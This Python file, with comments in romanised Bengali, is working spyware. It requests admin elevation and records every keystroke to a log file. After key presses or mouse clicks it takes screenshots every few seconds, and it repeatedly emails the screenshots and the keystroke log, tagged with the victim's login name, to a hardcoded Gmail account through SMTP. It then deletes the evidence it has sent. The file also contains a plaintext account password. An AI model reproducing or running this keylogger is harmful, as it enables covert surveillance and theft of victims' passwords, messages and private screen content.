import pyautogui
from pynput.keyboard import Listener as Listenerk 
from pynput.mouse import Listener as Listenerm 
#vanila
import time
import logging
import smtplib
import os
from urllib.request import urlopen
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.utils import COMMASPACE, formatdate
import threading
import sys, traceback, types



#Admin code start

def isUserAdmin():

    if os.name == 'nt':
        import ctypes
        # WARNING: requires Windows XP SP2 or higher!
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            traceback.print_exc()
            print ("Admin check failed, assuming not an admin.")
            return False
    elif os.name == 'posix':
        # Check for root on Posix
        return os.getuid() == 0
    else:
        print("Unsup os")

def runAsAdmin(cmdLine=None, wait=True):

    if os.name != 'nt':
#        raise RuntimeError, "This function is only implemented on Windows."
        print("This function is only implemented on Windows.")

    import win32api, win32con, win32event, win32process
    from win32com.shell.shell import ShellExecuteEx
    from win32com.shell import shellcon

    python_exe = sys.executable

    if cmdLine is None:
        cmdLine = [python_exe] + sys.argv
    elif type(cmdLine) not in (types.TupleType,types.ListType):
#        raise ValueError, "cmdLine is not a sequence."
        print("cmdLine is not a sequence.")
    cmd = '"%s"' % (cmdLine[0],)
    # XXX TODO: isn't there a function or something we can call to massage command line params?
    params = " ".join(['"%s"' % (x,) for x in cmdLine[1:]])
    cmdDir = ''
    showCmd = win32con.SW_SHOWNORMAL
    #showCmd = win32con.SW_HIDE
    lpVerb = 'runas'  # causes UAC elevation prompt.

    # print "Running", cmd, params

    # ShellExecute() doesn't seem to allow us to fetch the PID or handle
    # of the process, so we can't get anything useful from it. Therefore
    # the more complex ShellExecuteEx() must be used.

    # procHandle = win32api.ShellExecute(0, lpVerb, cmd, params, cmdDir, showCmd)

    procInfo = ShellExecuteEx(nShow=showCmd,
                              fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                              lpVerb=lpVerb,
                              lpFile=cmd,
                              lpParameters=params)

    if wait:
        procHandle = procInfo['hProcess']    
        obj = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
        rc = win32process.GetExitCodeProcess(procHandle)
        #print "Process handle %s returned code %s" % (procHandle, rc)
    else:
        rc = None

    return rc



if not isUserAdmin():
        runAsAdmin()



time.sleep(60)

newpath = 'Ghum/' 
if not os.path.exists(newpath):
    os.makedirs(newpath)

clicked = False

def keylog():
    #Keylogging
    logging.basicConfig(filename='test.log', level=logging.DEBUG,
                        format='%(asctime)s: %(message)s:')
    #Comment ESC key
    def on_press(key):
        global clicked
        clicked =True
        logging.debug(str(key))
        
    
    with Listenerk(on_press=on_press) as listenerk:
        listenerk.join()

    

    
#Screenshot

def screenshottimelater():
    global clicked
    while True:
        if clicked == True:
#            print("if ar vitore")
            run_time = 60 #extra 60 sec with actual time
            time_end = time.time() + run_time
            
            
            fname='c.txt'
            x=0
            if os.path.isfile(fname)  == False:
                file = open('c.txt','w')
                file.writelines(str(x))
                file.close()
                #print("nai kortasi")
            #else:
            #    #print('ase already')
            
            file = open('c.txt','r')    
            x=int(file.readline())
            file.close()
            
            #Check for the folder
            newpath = 'chit/' 
            if not os.path.exists(newpath):
                os.makedirs(newpath)
            
            while time.time() < time_end:
                x+=1
                time.sleep(3)
                try:
                    pyautogui.screenshot('chit/'+str(x)+'.png')
                except:
                    pass
                file = open('c.txt','w')
                file.writelines(str(x))
                file.close()
#                print("run hy")
            clicked =False
        else:
#            print("akno o false")
            pass
    
    
    
    
    
    
    
    

#MOuse Click hoile e on !!!!!!
def main_click():
    global clicked
    while True:
#        print ("M clck")
#        print(clicked)
        def on_click(x, y, button, pressed):
            global clicked
            clicked =True
#            print ("Mouse clicked")
        
        
        with Listenerm(on_click=on_click) as listenermouse:
            listenermouse.join()

    
def internet_on():
   try:
        response = urlopen('https://www.google.com/', timeout=2)
        return True
   except: 
        return False
    
def sentmaal():
    while True:
        if internet_on() == False:
            print("Internet nai pore pathabo pic")
        else :
            print("Internet ase pathaitasi pic")
            email_user = 'pstu.sarver@gmail.com'
            email_password = 'bn<>??rPstuserver123'
            email_send = 'pstu.sarver@gmail.com'
            text= "Test pic ;)"
            pc_name = os.getlogin()
            subject = pc_name
        
            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = COMMASPACE.join(email_send)
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = subject
            
            msg.attach(MIMEText(text))
            # Send korar agey dekhbo j path ase naki
            newpath = 'chit/'
            if not os.path.exists(newpath):
                print("Internet ase kintu path nai chobi nai")
            else:    
                path='chit/'
                files = os.listdir(path)
                files = sorted(files,key=lambda x: int(os.path.splitext(x)[0]))
                
                
                filecount=len(files)
                if filecount >= 30:
                    cn=0
                    for f in files or []:
                        cn=cn+1
                        with open(f'{path}{f}', "rb") as fil:
                            part = MIMEApplication(
                                fil.read(),
                                Name=basename(f)
                            )
                        # After the file is closed
                        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
                        msg.attach(part)
                        if cn == 30:
                            break
                        
                    text = msg.as_string()
        
                    
                    try:
                        server = smtplib.SMTP('smtp.gmail.com',587)
                        server.starttls()
                        server.login(email_user,email_password)
                        server.sendmail(email_user,email_send,text)
                        server.quit()
                        print("Mail gayse pic")
                        for x in range(30):
                            os.remove(f'{path}/{files[x]}')
                    except: 
                        print("Mail a kono prb")
        
                else:
                    print("30 ar kom file")
        time.sleep(20)
        
def sentkey():
    while True:
        file = open('test.log','r')
        log = file.readlines()
        log_len = len(log)
        if log_len > 0:
            if internet_on() == False:
                print("Internet nai pore pathabo key")
            else :
                print("Internet ase pathaitasi")
                email_user = 'pstu.sarver@gmail.com'
                email_password = 'bn<>??rPstuserver123'
                email_send = 'pstu.sarver@gmail.com'
                text= "Test key ;)"
                pc_name = os.getlogin()
                subject = f'Chabi_{pc_name}'
            
                msg = MIMEMultipart()
                msg['From'] = email_user
                msg['To'] = COMMASPACE.join(email_send)
                msg['Date'] = formatdate(localtime=True)
                msg['Subject'] = subject
                
                msg.attach(MIMEText(text))
                # Send korar agey dekhbo j path ase naki
                newpath = 'test.log'
                if not os.path.exists(newpath):
                    print("Key nai net ase")
                else:    
                    files = ['test.log']
                    for f in files or []:
                        with open(f, "rb") as fil:
                            part = MIMEApplication(
                                fil.read(),
                                Name=basename(f)
                            )
                        # After the file is closed
                        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
                        msg.attach(part)
                        
                    text = msg.as_string()
        
                    
                    try:
                        server = smtplib.SMTP('smtp.gmail.com',587)
                        server.starttls()
                        server.login(email_user,email_password)
                        server.sendmail(email_user,email_send,text)
                        server.quit()
                        file = open('test.log','r')
                        log = file.readlines()
                        log_len = len(log)
                        file.close()
                        open('test.log', 'w').writelines(log[log_len:])
                        file.close()
                        print("Mail gayse key ta ")
                    except: 
                        print("Mail a kono prb")
        time.sleep(300)       
        
KeyT1 = threading.Thread(target=keylog)
MClickT2 = threading.Thread(target=main_click)
ScreenTakT3 = threading.Thread(target=screenshottimelater)
MailJyT4 = threading.Thread(target=sentmaal)
KeyMailjyT5 = threading.Thread(target=sentkey)

KeyT1.start()
MClickT2.start()
ScreenTakT3.start() 
MailJyT4.start()
KeyMailjyT5.start()
   



